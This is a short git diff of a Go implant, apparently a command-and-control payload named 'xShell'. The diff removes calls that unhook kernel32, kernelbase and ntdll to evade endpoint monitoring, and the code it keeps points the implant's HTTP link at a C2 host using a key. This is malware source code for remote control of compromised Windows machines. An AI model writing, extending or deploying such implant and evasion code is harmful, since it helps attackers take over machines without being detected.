@@ -1,14 +1,11 @@
 package main
 
-import "C"
 import (
 	"fmt"
 	"io"
 	"os"
 	"time"
 	"xShell/payload/internal"
-
-	"github.com/coremedic/goldr/pkg/evasion"
 )
 
 // TODO: pad keys
@@ -20,9 +17,6 @@ func Entry() {
 }
 
 func main() {
-	evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
-	evasion.UnHookDll(`c:\windows\system32\kernelbase.dll`)
-	evasion.UnHookDll(`c:\windows\system32\ntdll.dll`)
 	internal.HttpLink.Host = C2Host
 	internal.HttpLink.Key = []byte(KeyStr)
 	id, err := getId()
